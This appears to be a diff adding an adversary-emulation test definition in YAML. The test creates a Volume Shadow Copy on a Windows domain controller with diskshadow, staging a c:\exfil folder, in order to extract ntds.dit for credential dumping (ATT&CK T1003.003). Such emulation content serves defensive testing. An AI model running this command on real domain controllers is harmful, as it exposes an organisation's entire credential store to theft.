@@ -1,0 +1,20 @@
+---
+- id: 1a9594af08d4b31e19d6ff4cdeb02a2e
+  name: Create Volume Shadow Copy with diskshadow
+  description: 'This test is intended to be run on a domain controller
+
+    An alternative to using vssadmin to create a Volume Shadow Copy for extracting
+    ntds.dit
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      cmd:
+        command: mkdir c:\exfil && diskshadow.exe /s 6c3749_diskshadow.txt
+        payloads:
+        - 6c3749_diskshadow.txt
+        cleanup: ''
